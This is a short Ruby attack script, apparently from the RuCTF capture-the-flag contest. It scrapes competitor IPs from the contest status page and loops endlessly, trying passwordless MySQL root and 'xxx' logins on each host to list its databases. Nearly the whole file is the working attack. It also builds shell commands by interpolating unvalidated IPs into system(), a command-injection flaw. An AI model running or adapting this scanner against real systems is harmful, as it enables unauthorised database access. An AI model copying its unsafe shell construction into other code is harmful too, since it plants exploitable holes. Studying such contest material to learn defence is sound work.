#!/usr/bin/ruby
require 'open-uri'
require 'mechanize'
require 'socket'


INFECTED = %w'24 26 12 1 5 32 19 43'

PATCHED = %w''

DOWN = %w'33 32 40 46 22 17 54 8 25 42 50 15 20 41 53 56 28'

ips = open('http://status.ructf.org/').read.
  scan(/\d+\.\d+\.\d+\.\d+/).
  uniq.
  map{ |x| x.sub(/\.4$/,'.3') } - (PATCHED+DOWN).map{|x| "10.#{x}.0.3"}

def process ip
  system "mysql -h #{ip} -u root -e 'show databases' --connect_timeout=5"
  system "mysql -h #{ip} -u xxx  -e 'show databases' --connect_timeout=5"
  sleep 0.5
end

if ARGV.any?
  ARGV.each{ |ip| process ip }
end

while true do
  ips.each{ |ip| process ip }
end
